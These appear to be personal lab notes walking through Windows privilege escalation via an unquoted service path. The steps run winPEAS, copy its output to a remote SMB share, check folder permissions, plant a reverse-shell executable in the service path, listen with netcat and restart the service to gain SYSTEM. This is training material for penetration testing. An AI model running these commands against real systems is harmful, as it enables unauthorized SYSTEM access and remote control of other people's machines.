1x2 Service - Unquoated Path

## Service - Unquoated Path
```bash
.\winPEASany.exe ansi quiet servicesinfo > wpeas_services_op.txt
copy C:\PrivEsc\wpeas_services_op.txt \\10.9.4.127\kali\wpeas_services_op.txt
cat wpeas_services_op.txt
```
Identified 1 service mis-configuration

![53b0690e56c68db5243ec17b3dfa8b5e.png](../_resources/725a41247cf04c59baee5f137d745377.png)

```bash
sc qc unquotedsvc
```
![f4f0aa2315fdbe87b154fdfef5e9490c.png](../_resources/79af260d3c894a12bbfd2b555e0f3429.png)

```console
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\"
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\Common Files\"
```
![af8fe927324a06aaa615512f39052d83.png](../_resources/c7017cb9d64a433e9335c33495356499.png)

```console
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
![865e02649a75936b31bcb753dcabc416.png](../_resources/5858abb01d6946bbba8fa6b1bdd6662f.png)

```bash
sudo nc -nvlp 53
net start unquotedsvc
```

**Got System**

![2636ff098d04d081f574cd6308fbfd97.png](../_resources/491dfba64bb34a33b09ca8bdf04f608f.png)